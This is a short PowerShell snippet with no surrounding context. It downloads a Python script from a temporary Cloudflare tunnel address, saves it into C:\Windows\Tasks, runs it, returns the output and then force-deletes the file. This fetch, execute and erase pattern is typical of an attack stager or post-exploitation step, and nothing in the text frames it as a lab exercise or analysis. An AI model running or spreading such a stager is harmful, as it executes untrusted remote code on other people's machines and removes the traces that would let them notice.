$pyScriptUrl = "https://taxes-surprised-immediately-transportation.trycloudflare.com/scripts/list-exports.py"
$bytes = (Invoke-WebRequest -Uri $pyScriptUrl -UseBasicParsing).Content
[System.IO.File]::WriteAllBytes("C:\Windows\Tasks\exports.py", $bytes)
$r = & "C:\Program Files\Python310\python.exe" "C:\Windows\Tasks\exports.py" 2>&1
$r -join "`n"
Remove-Item "C:\Windows\Tasks\exports.py" -Force
